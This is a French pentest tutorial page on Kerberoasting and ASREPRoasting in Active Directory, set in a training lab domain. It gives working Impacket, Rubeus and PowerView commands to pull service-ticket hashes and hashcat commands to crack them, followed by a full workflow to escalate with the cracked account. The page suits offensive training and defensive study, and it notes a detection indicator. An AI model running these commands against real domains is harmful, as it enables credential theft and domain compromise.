# Kerberoasting

Le Kerberoasting exploite le fonctionnement normal de Kerberos : tout utilisateur authentifie peut demander un ticket de service (TGS) pour n'importe quel compte qui possede un SPN (Service Principal Name). Le TGS est chiffre avec le hash du mot de passe du compte de service, ce qui permet de le cracker offline sans generer d'alerte de verrouillage.

## Pourquoi

Les comptes de service AD avec un SPN sont des cibles de choix. Ils ont souvent des mots de passe faibles (definis manuellement, rarement changes), des privileges eleves (membre de groupes admin, delegations), et leur TGS est accessible a n'importe quel utilisateur du domaine. Un seul compte de service cracke peut donner un acces Domain Admin direct.

## Comment ca marche

### Le mecanisme Kerberos

1. L'utilisateur s'authentifie aupres du KDC (DC) et obtient un TGT (Ticket Granting Ticket)
2. L'utilisateur demande un TGS pour un service specifique (identifie par son SPN)
3. Le KDC retourne le TGS, chiffre avec le hash NTLM du compte de service
4. L'utilisateur peut extraire ce TGS et tenter de le cracker offline

Le KDC ne verifie pas si l'utilisateur a reellement besoin d'acceder au service. Tout utilisateur authentifie peut demander un TGS pour n'importe quel SPN.

{% hint style="info" %}
Les comptes machine ont des mots de passe de 128 caracteres aleatoires, impossibles a cracker. Le Kerberoasting ne cible que les **comptes utilisateurs** avec un SPN (comptes de service configures manuellement).
{% endhint %}

### Depuis Linux

```bash
# - Lister les comptes avec un SPN et extraire les TGS
GetUserSPNs.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' \
    -dc-ip <IP_DC> -request

# - Sauvegarder directement dans un fichier
GetUserSPNs.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' \
    -dc-ip <IP_DC> -request -outputfile tgs_hashes.txt
```

La sortie contient les hashes au format Hashcat ($krb5tgs$23$*...) :

```
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$...
$krb5tgs$23$*svc_mssql$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/svc_mssql*$...
```

### Depuis Windows

{% tabs %}
{% tab title="Rubeus" %}
```powershell
# - Extraire les TGS de tous les comptes Kerberoastable
.\Rubeus.exe kerberoast /outfile:tgs_hashes.txt

# - Cibler un compte specifique
.\Rubeus.exe kerberoast /user:sqldev /outfile:sqldev_tgs.txt

# - Avec stats (nombre de comptes, types de chiffrement)
.\Rubeus.exe kerberoast /stats
```
{% endtab %}
{% tab title="PowerView" %}
```powershell
# - Lister les comptes avec un SPN
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# - Demander un TGS
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat |
    Export-Csv tgs.csv -NoTypeInformation
```
{% endtab %}
{% tab title="setspn (natif)" %}
```cmd
# - Lister tous les SPN du domaine (outil Windows natif)
setspn.exe -Q */*

# - Filtrer les comptes utilisateurs (pas les machines)
setspn.exe -Q */* | findstr /v "CN=Computers"
```
{% endtab %}
{% endtabs %}

### Cracker les TGS

```bash
# - Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23 - RC4)
hashcat -m 13100 tgs_hashes.txt /opt/wordlists/rockyou.txt

# - Avec des regles pour augmenter les chances
hashcat -m 13100 tgs_hashes.txt /opt/wordlists/rockyou.txt \
    --rules-file /opt/hashcat/rules/d3ad0ne.rule

# - AES256 (etype 17/18, plus rare mais plus long a cracker)
hashcat -m 19700 tgs_hashes.txt /opt/wordlists/rockyou.txt
```

{% hint style="warning" %}
Les tickets chiffres en RC4 (etype 23) sont les plus rapides a cracker. Certains environnements forcent AES256 (etype 18), ce qui ralentit le cracking d'un facteur 10+. Rubeus permet de forcer la demande en RC4 avec `/tgtdeleg` quand c'est possible.
{% endhint %}

### Variante : ASREPRoasting

Les comptes avec l'option "Do not require Kerberos preauthentication" permettent de demander un AS-REP sans meme s'authentifier. Le hash AS-REP peut etre cracke offline.

```bash
# - Depuis Linux (Impacket)
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip <IP_DC> \
    -usersfile users.txt -format hashcat -outputfile asrep.txt

# - Depuis Windows (Rubeus)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# - Cracker (mode 18200)
hashcat -m 18200 asrep.txt /opt/wordlists/rockyou.txt
```

## En pratique

```bash
# Workflow Kerberoasting complet

# 1 - Identifier les comptes avec un SPN
GetUserSPNs.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' -dc-ip <IP_DC>

# 2 - Extraire les TGS
GetUserSPNs.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' \
    -dc-ip <IP_DC> -request -outputfile tgs.txt

# 3 - Cracker
hashcat -m 13100 tgs.txt /opt/wordlists/rockyou.txt \
    --rules-file /opt/hashcat/rules/d3ad0ne.rule

# 4 - Verifier les privileges du compte cracke
crackmapexec smb <IP_DC> -u '<SVC_USER>' -p '<PASSWORD>'
bloodhound-python -u '<SVC_USER>' -p '<PASSWORD>' \
    -d INLANEFREIGHT.LOCAL -ns <IP_DC> -c All
```

## Pieges et galeres

- **Mots de passe forts** : les comptes de service geres (gMSA) ont des mots de passe de 120+ caracteres, impossibles a cracker. Se concentrer sur les comptes de service manuels
- **AES vs RC4** : si le TGS est en AES256, le cracking sera beaucoup plus lent. Utiliser `Rubeus kerberoast /tgtdeleg` pour forcer RC4 quand possible
- **Faux positifs** : les comptes machines ont des SPN mais des mots de passe non crackables. Filtrer sur les comptes utilisateurs uniquement
- **Detection** : la demande de TGS pour de nombreux services en peu de temps est un indicateur de Kerberoasting. Un SOC mature le detectera (Event ID 4769 avec le code de chiffrement 0x17)

## Retour terrain

Le Kerberoasting est une des techniques les plus fiables du pentest AD. En pratique, la majorite des environnements ont au moins un compte de service avec un mot de passe faible. Les comptes SQL Server, les comptes de backup, et les comptes d'application legacy sont les cibles les plus frequentes. Le cracking avec de bonnes wordlists et des regles (d3ad0ne, OneRuleToRuleThemAll) reussit dans la majorite des cas.

L'ASREPRoasting est moins courant (l'option "Do not require Kerberos preauthentication" est rarement activee), mais quand c'est le cas, ca donne un acces sans meme avoir besoin d'un compte initial.

## Memo express

| Technique | Outil Linux | Outil Windows | Hashcat |
|---|---|---|---|
| Kerberoasting | `GetUserSPNs.py -request` | `Rubeus kerberoast` | `-m 13100` (RC4) |
| ASREPRoasting | `GetNPUsers.py` | `Rubeus asreproast` | `-m 18200` |
| Lister SPN | `GetUserSPNs.py` (sans -request) | `setspn.exe -Q */*` | N/A |
| Kerberoast AES | `GetUserSPNs.py -request` | `Rubeus kerberoast` | `-m 19700` (AES256) |

***
